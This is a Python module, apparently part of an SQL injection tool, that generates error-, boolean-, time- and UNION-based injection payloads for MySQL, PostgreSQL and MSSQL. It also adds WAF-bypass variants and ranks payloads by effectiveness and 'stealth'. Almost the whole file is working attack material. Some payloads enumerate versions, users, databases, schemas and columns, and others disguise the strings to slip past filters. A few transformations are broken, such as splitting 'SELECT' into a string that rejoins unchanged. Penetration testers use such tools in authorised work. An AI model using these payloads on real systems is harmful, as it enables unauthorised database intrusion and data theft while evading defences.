#!/usr/bin/env python3
"""
Payload Engine
Generates SQL injection payloads for different database types and injection techniques
"""

import random
import string
import urllib.parse
from typing import List, Dict, Tuple
from enum import Enum
import logging

class InjectionType(Enum):
    ERROR_BASED = "error_based"
    BOOLEAN_BASED = "boolean_based"
    TIME_BASED = "time_based"
    UNION_BASED = "union_based"

class DatabaseType(Enum):
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"

class PayloadGenerator:
    """Generates SQL injection payloads"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.random_strings = self._generate_random_strings()
    
    def _generate_random_strings(self, count: int = 10) -> List[str]:
        """Generate random strings for unique identification"""
        return [''.join(random.choices(string.ascii_lowercase, k=8)) for _ in range(count)]
    
    def generate_error_based_payloads(self, db_type: DatabaseType) -> List[str]:
        """Generate error-based SQL injection payloads"""
        payloads = []
        
        if db_type == DatabaseType.MYSQL:
            payloads.extend([
                "'",
                "\"",
                "\\",
                "' OR 1=1 -- ",
                "' OR 1=1#",
                "\" OR 1=1 -- ",
                "' UNION SELECT 1,2,3,4,5 -- ",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- ",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) -- ",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- ",
                "' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) -- ",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- "
            ])
        
        elif db_type == DatabaseType.POSTGRESQL:
            payloads.extend([
                "'",
                "\"",
                "' OR 1=1 -- ",
                "' UNION SELECT NULL,NULL,NULL -- ",
                "' AND 1=CAST((SELECT version()) AS INT) -- ",
                "' AND 1=CAST((SELECT current_database()) AS INT) -- ",
                "' AND 1=CAST((SELECT current_user()) AS INT) -- ",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RANDOM(0)*2))x FROM information_schema.tables GROUP BY x)a) -- "
            ])
        
        elif db_type == DatabaseType.MSSQL:
            payloads.extend([
                "'",
                "\"",
                "' OR 1=1 -- ",
                "' UNION SELECT NULL,NULL,NULL -- ",
                "' AND 1=CONVERT(INT,(SELECT @@version)) -- ",
                "' AND 1=CONVERT(INT,(SELECT DB_NAME())) -- ",
                "' AND 1=CONVERT(INT,(SELECT USER_NAME())) -- ",
                "' AND 1=CONVERT(INT,(SELECT SYSTEM_USER)) -- "
            ])
        
        return payloads
    
    def generate_boolean_based_payloads(self, db_type: DatabaseType) -> List[str]:
        """Generate boolean-based SQL injection payloads"""
        payloads = []
        
        if db_type == DatabaseType.MYSQL:
            payloads.extend([
                "' AND 1=1 -- ",
                "' AND 1=2 -- ",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 -- ",
                "' AND (SELECT LENGTH(database()))>0 -- ",
                "' AND (SELECT SUBSTRING(database(),1,1))='a' -- ",
                "' AND (SELECT ASCII(SUBSTRING(database(),1,1)))=97 -- ",
                "' AND (SELECT COUNT(*) FROM mysql.user)>0 -- "
            ])
        
        elif db_type == DatabaseType.POSTGRESQL:
            payloads.extend([
                "' AND 1=1 -- ",
                "' AND 1=2 -- ",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 -- ",
                "' AND (SELECT LENGTH(current_database()))>0 -- ",
                "' AND (SELECT SUBSTRING(current_database(),1,1))='a' -- ",
                "' AND (SELECT ASCII(SUBSTRING(current_database(),1,1)))=97 -- "
            ])
        
        elif db_type == DatabaseType.MSSQL:
            payloads.extend([
                "' AND 1=1 -- ",
                "' AND 1=2 -- ",
                "' AND (SELECT COUNT(*) FROM sysobjects)>0 -- ",
                "' AND (SELECT LEN(DB_NAME()))>0 -- ",
                "' AND (SELECT SUBSTRING(DB_NAME(),1,1))='a' -- ",
                "' AND (SELECT ASCII(SUBSTRING(DB_NAME(),1,1)))=97 -- "
            ])
        
        return payloads
    
    def generate_time_based_payloads(self, db_type: DatabaseType) -> List[str]:
        """Generate time-based SQL injection payloads"""
        payloads = []
        
        if db_type == DatabaseType.MYSQL:
            payloads.extend([
                "' AND SLEEP(5) -- ",
                "' AND (SELECT SLEEP(5)) -- ",
                "' AND BENCHMARK(5000000,MD5(1)) -- ",
                "' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) -- ",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- "
            ])
        
        elif db_type == DatabaseType.POSTGRESQL:
            payloads.extend([
                "' AND pg_sleep(5) -- ",
                "' AND (SELECT pg_sleep(5)) -- ",
                "' AND (SELECT COUNT(*) FROM generate_series(1,1000000)) -- "
            ])
        
        elif db_type == DatabaseType.MSSQL:
            payloads.extend([
                "' AND WAITFOR DELAY '00:00:05' -- ",
                "' AND (SELECT WAITFOR DELAY '00:00:05') -- ",
                "' AND (SELECT COUNT(*) FROM sysobjects A, sysobjects B, sysobjects C) -- "
            ])
        
        return payloads
    
    def generate_union_based_payloads(self, db_type: DatabaseType) -> List[str]:
        """Generate UNION-based SQL injection payloads"""
        payloads = []
        
        # Column count discovery payloads
        for columns in range(1, 11):
            if db_type == DatabaseType.MYSQL:
                payloads.append(f"' ORDER BY {columns} -- ")
                payloads.append(f"' UNION SELECT {','.join(['NULL']*columns)} -- ")
            elif db_type == DatabaseType.POSTGRESQL:
                payloads.append(f"' ORDER BY {columns} -- ")
                payloads.append(f"' UNION SELECT {','.join(['NULL']*columns)} -- ")
            elif db_type == DatabaseType.MSSQL:
                payloads.append(f"' ORDER BY {columns} -- ")
                payloads.append(f"' UNION SELECT {','.join(['NULL']*columns)} -- ")
        
        # Database enumeration payloads
        if db_type == DatabaseType.MYSQL:
            payloads.extend([
                "' UNION SELECT 1,database(),user(),version(),5 -- ",
                "' UNION SELECT 1,@@version,@@datadir,3,4 -- ",
                "' UNION SELECT 1,table_name,column_name,3,4 FROM information_schema.columns -- ",
                "' UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata -- "
            ])
        
        elif db_type == DatabaseType.POSTGRESQL:
            payloads.extend([
                "' UNION SELECT 1,current_database(),current_user(),version(),5 -- ",
                "' UNION SELECT 1,table_name,column_name,3,4 FROM information_schema.columns -- ",
                "' UNION SELECT 1,schema_name,3,4,5 FROM information_schema.schemata -- "
            ])
        
        elif db_type == DatabaseType.MSSQL:
            payloads.extend([
                "' UNION SELECT 1,DB_NAME(),USER_NAME(),@@VERSION,5 -- ",
                "' UNION SELECT 1,table_name,column_name,3,4 FROM information_schema.columns -- ",
                "' UNION SELECT 1,name,3,4,5 FROM sys.databases -- "
            ])
        
        return payloads
    
    def generate_waf_bypass_payloads(self, original_payload: str) -> List[str]:
        """Generate WAF bypass variations of a payload"""
        bypass_payloads = []
        
        # URL encoding variations
        bypass_payloads.append(urllib.parse.quote(original_payload))
        bypass_payloads.append(urllib.parse.quote(original_payload, safe=''))
        
        # Double URL encoding
        bypass_payloads.append(urllib.parse.quote(urllib.parse.quote(original_payload)))
        
        # Case variations
        bypass_payloads.append(original_payload.upper())
        bypass_payloads.append(original_payload.lower())
        
        # Comment variations
        bypass_payloads.append(original_payload.replace(' -- ', ' /* */ '))
        bypass_payloads.append(original_payload.replace('--', '/*comment*/'))
        
        # Space variations
        bypass_payloads.append(original_payload.replace(' ', '/**/'))
        bypass_payloads.append(original_payload.replace(' ', '%20'))
        bypass_payloads.append(original_payload.replace(' ', '+'))
        
        # Tab and newline variations
        bypass_payloads.append(original_payload.replace(' ', '\t'))
        bypass_payloads.append(original_payload.replace(' ', '\n'))
        
        # Function concatenation
        bypass_payloads.append(original_payload.replace('SELECT', 'SEL' + 'ECT'))
        bypass_payloads.append(original_payload.replace('UNION', 'UN' + 'ION'))
        bypass_payloads.append(original_payload.replace('FROM', 'FR' + 'OM'))
        
        # Hex encoding for keywords
        bypass_payloads.append(original_payload.replace('SELECT', '0x53454c454354'))
        bypass_payloads.append(original_payload.replace('UNION', '0x554e494f4e'))
        
        # Inline comments
        bypass_payloads.append(original_payload.replace('SELECT', 'SE/**/LECT'))
        bypass_payloads.append(original_payload.replace('UNION', 'UN/**/ION'))
        bypass_payloads.append(original_payload.replace('FROM', 'FR/**/OM'))
        
        # Version-specific bypasses
        bypass_payloads.extend([
            original_payload + ' AND 1=1 #',
            original_payload + ' AND 1=2 #',
            original_payload + ' /*!00000AND*/ 1=1 -- ',
            original_payload + ' /*!00000UNION*/ SELECT -- '
        ])
        
        return list(set(bypass_payloads))  # Remove duplicates
    
    def generate_all_payloads(self, db_type: DatabaseType) -> Dict[str, List[str]]:
        """Generate all types of payloads for a specific database"""
        all_payloads = {
            'error_based': self.generate_error_based_payloads(db_type),
            'boolean_based': self.generate_boolean_based_payloads(db_type),
            'time_based': self.generate_time_based_payloads(db_type),
            'union_based': self.generate_union_based_payloads(db_type)
        }
        
        # Add WAF bypass variations for each payload type
        payload_types = list(all_payloads.keys())  # Create a list to avoid modification during iteration
        for payload_type in payload_types:
            bypass_payloads = []
            for payload in all_payloads[payload_type]:
                bypass_payloads.extend(self.generate_waf_bypass_payloads(payload))
            all_payloads[payload_type + '_bypass'] = bypass_payloads
        
        return all_payloads
    
    def get_custom_payloads(self, custom_payloads: List[str]) -> List[str]:
        """Process custom payloads provided by user"""
        processed_payloads = []
        for payload in custom_payloads:
            processed_payloads.append(payload)
            processed_payloads.extend(self.generate_waf_bypass_payloads(payload))
        return processed_payloads

class PayloadOptimizer:
    """Optimizes payload order and selection"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
    
    def optimize_payload_order(self, payloads: List[str], strategy: str = 'effectiveness') -> List[str]:
        """Optimize payload testing order based on strategy"""
        if strategy == 'effectiveness':
            # Order by likely effectiveness (simple payloads first)
            priority_payloads = []
            other_payloads = []
            
            for payload in payloads:
                if self._is_high_priority(payload):
                    priority_payloads.append(payload)
                else:
                    other_payloads.append(payload)
            
            return priority_payloads + other_payloads
        
        elif strategy == 'stealth':
            # Order by stealthiness (complex payloads first)
            return sorted(payloads, key=self._get_stealth_score, reverse=True)
        
        elif strategy == 'speed':
            # Order by expected response time
            return sorted(payloads, key=self._get_speed_score)
        
        return payloads
    
    def _is_high_priority(self, payload: str) -> bool:
        """Check if payload should be tested first"""
        high_priority_indicators = [
            "'",
            "\"",
            "' OR 1=1",
            "' AND 1=1",
            "' AND 1=2",
            "UNION SELECT"
        ]
        
        return any(indicator in payload.upper() for indicator in high_priority_indicators)
    
    def _get_stealth_score(self, payload: str) -> int:
        """Calculate stealth score (higher = more stealthy)"""
        score = 0
        
        if '/**/' in payload:
            score += 2
        if '/*' in payload:
            score += 1
        if '%' in payload:
            score += 1
        if payload.isupper() or payload.islower():
            score += 1
        if len(payload) > 50:
            score += 1
        
        return score
    
    def _get_speed_score(self, payload: str) -> int:
        """Calculate speed score (lower = faster)"""
        if 'SLEEP' in payload.upper() or 'BENCHMARK' in payload.upper():
            return 10  # Time-based are slowest
        elif 'UNION' in payload.upper():
            return 5   # UNION-based are medium
        else:
            return 1   # Error-based are fastest
